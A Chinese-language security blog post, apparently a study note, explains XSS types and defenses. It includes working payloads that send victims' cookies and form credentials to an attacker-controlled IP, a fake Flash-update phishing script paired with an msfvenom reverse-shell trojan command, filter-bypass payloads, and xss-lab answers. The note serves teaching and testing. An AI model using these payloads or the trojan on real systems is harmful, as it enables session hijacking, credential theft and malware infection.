@@ -1,0 +1,438 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/favicon/apple-touch-icon.png?v=2.8.0" sizes="180x180"><meta name="description" content="XSS漏洞介绍       ​	XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets，CSS)的缩写混淆，故缩写为XSS。这是一种将任意JavaScript代码插入到其他Web用户页面里面执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里面嵌入恶意代码。当用户浏览该页时，这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS漏洞">
+<meta property="og:url" content="https://www.ixxzhi.cn/2023/08/20/XSS%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="冰糖の部落阁">
+<meta property="og:description" content="XSS漏洞介绍       ​	XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets，CSS)的缩写混淆，故缩写为XSS。这是一种将任意JavaScript代码插入到其他Web用户页面里面执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里面嵌入恶意代码。当用户浏览该页时，这">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://qiniu2.ixxzhi.cn/image-20230414205357292.png">
+<meta property="og:image" content="http://qiniu2.ixxzhi.cn/image-20230414205750701.png">
+<meta property="article:published_time" content="2023-08-19T16:01:39.000Z">
+<meta property="article:modified_time" content="2023-09-14T01:53:30.547Z">
+<meta property="article:author" content="冰糖小混子">
+<meta property="article:tag" content="常见Web漏洞">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://qiniu2.ixxzhi.cn/image-20230414205357292.png"><title>XSS漏洞 | 冰糖の部落阁</title><link ref="canonical" href="https://www.ixxzhi.cn/2023/08/20/XSS%E6%BC%8F%E6%B4%9E/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: {"appId":"AKOK4JB6FU","apiKey":"afe2853f80920ee4cdb1d45209c0ecf2","indexName":"blog_ixxzhi","hits":{"per_page":10},"languages":{"inputPlaceholder":"搜索文章","hitsEmpty":"没有找到任何搜索结果：${query}","hitsStats":"找到 ${hits} 条搜索结果，耗时 ${time} 毫秒"}},
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">冰糖の部落阁</div><div class="header-banner-info__subtitle">冰糖的笔记和随笔</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">XSS漏洞</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-09-14</span></span></div></header><div class="post-body">
+        <h1 id="XSS漏洞介绍"   >
+          <a href="#XSS漏洞介绍" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS漏洞介绍" class="headerlink" title="XSS漏洞介绍"></a>XSS漏洞介绍</h1>
+      <p>​	XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets，CSS)的缩写混淆，故缩写为XSS。这是一种将任意JavaScript代码插入到其他Web用户页面里面执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里面嵌入恶意代码。当用户浏览该页时，这些嵌入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如cookie窃取等。</p>
+<span id="more"></span>
+
+
+        <h1 id="XSS产生原理"   >
+          <a href="#XSS产生原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS产生原理" class="headerlink" title="XSS产生原理"></a>XSS产生原理</h1>
+      <p>​	形成XSS漏洞的主要原因是程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输入到前端时被浏览器当作有效代码解析执行从而产生危害。</p>
+
+        <h1 id="XSS的危害"   >
+          <a href="#XSS的危害" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h1>
+      <ol>
+<li>网络钓鱼，包括获取各类用户账号</li>
+<li>窃取用户cookie资料，从而获取用户隐私信息</li>
+<li>劫持用户(浏览器)会话，从而执行任意操作</li>
+<li>强制弹出广告页面，刷流量等</li>
+<li>网页挂马</li>
+<li>结合其他漏洞，如scrf，实施进一步危害</li>
+</ol>
+
+        <h1 id="XSS常出现的地方"   >
+          <a href="#XSS常出现的地方" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS常出现的地方" class="headerlink" title="XSS常出现的地方"></a>XSS常出现的地方</h1>
+      <ol>
+<li><p>数据交互的地方</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">get</span>、post、cookies、headers</span><br><span class="line">反馈与浏览</span><br><span class="line">富文本编辑器</span><br><span class="line">各类标签插入和自定义</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>数据输出的地方</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户资料</span><br><span class="line">关键词、标签、说明</span><br><span class="line">文件上传</span><br></pre></td></tr></table></div></figure></li>
+</ol>
+
+        <h1 id="XSS类型"   >
+          <a href="#XSS类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1>
+      
+        <h2 id="反射型"   >
+          <a href="#反射型" class="heading-link"><i class="fas fa-link"></i></a><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2>
+      <p>​	又称为非持久型XSS，这种攻击方式往往具有一次性，只在用户单击时触发。跨站代码一般存在链接中，当受害者请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码通常不存储服务端。</p>
+
+        <h3 id="常出现的位置"   >
+          <a href="#常出现的位置" class="heading-link"><i class="fas fa-link"></i></a><a href="#常出现的位置" class="headerlink" title="常出现的位置"></a>常出现的位置</h3>
+      <p>搜索栏、用户登录入口、输入表单等</p>
+
+        <h3 id="攻击流程"   >
+          <a href="#攻击流程" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3>
+      <p><img src="http://qiniu2.ixxzhi.cn/image-20230414205357292.png" alt="image-20230414205357292"></p>
+
+        <h2 id="存储型"   >
+          <a href="#存储型" class="heading-link"><i class="fas fa-link"></i></a><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2>
+      <p>​	存储型XSS（Stored xss Attacks），也就是持久型XSS，比反射型XSS更具有威胁性。攻击脚本将被永久的存放在目标服务器的数据库或文件中。这是利用起来最方便的跨站类型，跨站代码存储与服务端（比如数据库中）。</p>
+
+        <h3 id="常出现的位置-1"   >
+          <a href="#常出现的位置-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#常出现的位置-1" class="headerlink" title="常出现的位置"></a>常出现的位置</h3>
+      <p>论坛、博客、留言板、网站的留言、评论、日志等交互处</p>
+
+        <h3 id="攻击流程-1"   >
+          <a href="#攻击流程-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h3>
+      <p><img src="http://qiniu2.ixxzhi.cn/image-20230414205750701.png" alt="image-20230414205750701"></p>
+
+        <h2 id="DOM型"   >
+          <a href="#DOM型" class="heading-link"><i class="fas fa-link"></i></a><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2>
+      <p>​	DOM是文档对象模型（Document Object Model）的缩写。它是HTML文档的对象表示，同时也是外部内容（例如JavaScript）与HTML元素之间的接口。解析树的根节点是“Document”对象。使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。</p>
+<p>​	它是基于DOM文档对象的一种漏洞，并且DOM型XSS是基于JS的，并不需要与服务器进行交互。</p>
+
+        <h2 id="XSS常用测试语句"   >
+          <a href="#XSS常用测试语句" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS常用测试语句" class="headerlink" title="XSS常用测试语句"></a>XSS常用测试语句</h2>
+      <figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert()</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">confirm(document[</span>`<span class="attr">coo</span>`+`<span class="attr">kie</span>`])/&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/payloadbox/xss-payload-list" >https://github.com/payloadbox/xss-payload-list</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="XSS攻击利用XSS平台"   >
+          <a href="#XSS攻击利用XSS平台" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS攻击利用XSS平台" class="headerlink" title="XSS攻击利用XSS平台"></a>XSS攻击利用XSS平台</h1>
+      
+        <h2 id="XSS平台"   >
+          <a href="#XSS平台" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h2>
+      <ol>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xss.yt/" >https://xss.yt</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+<li><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xssaq.com/" >https://xssaq.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
+<li>自己搭建平台</li>
+</ol>
+
+        <h2 id="手动测试"   >
+          <a href="#手动测试" class="heading-link"><i class="fas fa-link"></i></a><a href="#手动测试" class="headerlink" title="手动测试"></a>手动测试</h2>
+      <p>cookie.php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cookie</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;abc&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cookie.txt&#x27;</span>,<span class="variable">$cookie</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>payload</p>
+<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;http://100.100.100.26/cookie.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="beef-xss工具"   >
+          <a href="#beef-xss工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#beef-xss工具" class="headerlink" title="beef-xss工具"></a>beef-xss工具</h2>
+      <p>安装：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.loongten.com/2020/01/08/pentest-xss-beef/%EF%BC%88kali%E8%87%AA%E5%B8%A6%EF%BC%89" >http://www.loongten.com/2020/01/08/pentest-xss-beef/（kali自带）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="XSS钓鱼"   >
+          <a href="#XSS钓鱼" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS钓鱼" class="headerlink" title="XSS钓鱼"></a>XSS钓鱼</h2>
+      <p>version.js</p>
+<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params">name</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> iframe = <span class="variable language_">document</span>. <span class="title function_">createElement</span>(<span class="string">&quot;IFRAME&quot;</span>);</span><br><span class="line">	iframe.<span class="property">style</span>.<span class="property">display</span>=<span class="string">&quot;none&quot;</span>;</span><br><span class="line">	iframe.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&#x27;data:text/plain,&#x27;</span>);</span><br><span class="line">	<span class="variable language_">document</span>. documentElement.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line">	<span class="variable language_">window</span>.<span class="property">frames</span> [<span class="number">0</span>].<span class="property">window</span>.<span class="title function_">alert</span>(name);</span><br><span class="line">	iframe.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(iframe);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">alert</span>( <span class="string">&quot;您的FLASH版本过低，尝试升级后访问该⻚面! &quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>. location.<span class="property">href</span>=<span class="string">&quot;http://192.168.1.21:8000&quot;</span>;</span><br></pre></td></tr></table></div></figure>
+
+<p>payload</p>
+<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.1.2:8000/version.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>生成木马</p>
+<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=8000 -f exe &gt; flash.exe</span><br></pre></td></tr></table></div></figure>
+
+<p>使用winrar制作压缩包（自解压exe）</p>
+<p>将生成的木马放在网站上</p>
+
+        <h2 id="XSS表单劫持"   >
+          <a href="#XSS表单劫持" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS表单劫持" class="headerlink" title="XSS表单劫持"></a>XSS表单劫持</h2>
+      <p>​		已获取权限，但不知道管理员账号、密码</p>
+<p>pass.php</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$pass</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">	<span class="variable">$a</span>=<span class="string">&quot;账号：&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;密码：&quot;</span>.<span class="variable">$pass</span>.<span class="string">&quot;||&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;pass.txt&#x27;</span>,<span class="variable">$a</span>,FILE_APPEND | LOCK_EX);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>payload</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;script src=http://192.168.1.21/pass.php?name=&#x27;</span>.<span class="variable">$name</span>.<span class="string">&quot;&amp;pass=&quot;</span>.<span class="variable">$passow</span> rd.<span class="string">&#x27;&gt;&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="XSS常见绕过"   >
+          <a href="#XSS常见绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS常见绕过" class="headerlink" title="XSS常见绕过"></a>XSS常见绕过</h1>
+      <ul>
+<li><p>大小写绕过()</p>
+</li>
+<li><p>双写绕过</p>
+</li>
+<li><p>使用别的标签</p>
+</li>
+<li><p>编码绕过</p>
+<ul>
+<li>js编码、html实体编码、url编码、hex编码等</li>
+</ul>
+</li>
+<li><p>XSS黑名单绕过</p>
+<ul>
+<li><p>不使用<code>&quot; &quot;</code></p>
+<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&#x27;<span class="attr">1</span>&#x27;) <span class="attr">autofocus</span>/&gt;</span></span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>不使用 <code>&#39; &#39;</code> </p>
+<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(/1/)&quot;</span> <span class="attr">autofocus</span>/&gt;</span></span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>不使用 <code>()</code></p>
+<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert`&#x27;1&#x27;`&quot;</span> <span class="attr">autofocus</span>/&gt;</span></span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>不使用 <code>() &#39;&#39; &quot;&quot;</code> </p>
+<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert</span>`<span class="attr">1</span>`<span class="attr">autofocus</span>/&gt;</span></span><br></pre></td></tr></table></div></figure></li>
+</ul>
+</li>
+<li><p>使用html实体编码绕过</p>
+<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//方法一</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>&quot;</span> <span class="attr">autofocus</span>/&gt;</span></span><br><span class="line">//方法二</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#49&amp;#39&amp;#41&quot;</span> <span class="attr">autofocus</span>/&gt;</span></span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>XSS绕过-onclick触发</p>
+<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseenter</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li>onclick是鼠标点击事件，我们可以在元素中定义JavaScript事件；</li>
+<li>另一个绕过的办法就是在属性和&#x3D;之间插入一个空格</li>
+</ul>
+</li>
+</ul>
+
+        <h1 id="XSS防御"   >
+          <a href="#XSS防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1>
+      <p>​		因为XSS漏洞涉及输入和输出两部分，所以其修复也分两种</p>
+<p>A:过滤输入的数据，包括<code>  &#39; &quot; , &lt; &gt; on*</code> 等非法字符。</p>
+<p>B:对输出到页面的数据进行相应的编码转换，包括HTML实体编码、Javascript编码等。</p>
+<p>C:输出编码：主要用HTML实体代替字面量字符，这样做可以确保浏览器安全处理可能存在的恶意字符，将其当作HTML文档的内容而非结构加以处理。</p>
+<p><strong>常见的实体编码</strong> </p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>显示</th>
+<th>实体名字</th>
+<th>实体编号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt;</td>
+<td><code>&amp;lt;</code></td>
+<td><code>$#60;</code></td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td><code>&amp;gt;</code></td>
+<td><code>&amp;#62;</code></td>
+</tr>
+<tr>
+<td>&amp;</td>
+<td><code>&amp;amp;</code></td>
+<td><code>&amp;#38;</code></td>
+</tr>
+<tr>
+<td>‘</td>
+<td><code>&amp;quot;</code></td>
+<td><code>&amp;#34;</code></td>
+</tr>
+</tbody></table></div>
+<ol>
+<li><p>设置关键字黑名单</p>
+</li>
+<li><p>设置http-only</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44270509/article/details/102844897" >https://blog.csdn.net/weixin_44270509/article/details/102844897</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</li>
+<li><p>使用html实体编码等</p>
+</li>
+<li><p>SOP（同源策略）</p>
+<p>SOP把拥有相同主机名、协议和端口的页面视为同一来源，不同来源的资源之间交互是受到限制的。</p>
+</li>
+</ol>
+
+        <h1 id="XSS-lab"   >
+          <a href="#XSS-lab" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS-lab" class="headerlink" title="XSS-lab"></a>XSS-lab</h1>
+      <p>xss-lab通关：payload<br>第一关：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>第二关：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br>第三关：<code>&#39; onclick=&#39;alert(1)</code><br>第四关：<code>&quot; onclick=&quot;alert(1)</code><br>第五关：<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;</code><br>第六关：<code>&quot;&gt;&lt;a HRef=&#39;javaScript:alert(1)&#39;&gt;</code><br>第七关：<code>&quot;&gt;&lt;a hrhrefef=&#39;javascscriptript:alert(1)&#39;&gt;</code><br>第八关：<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101 ;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://www.ixxzhi.cn">冰糖小混子</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://www.ixxzhi.cn/2023/08/20/XSS%E6%BC%8F%E6%B4%9E/">https://www.ixxzhi.cn/2023/08/20/XSS%E6%BC%8F%E6%B4%9E/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/">常见Web漏洞</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://www.ixxzhi.cn/tags/XSS/">XSS</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/08/20/CSRF-SSRF/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">CSRF-SSRF</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/08/19/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">SQL注入漏洞</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="utterances-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">
+          XSS漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">
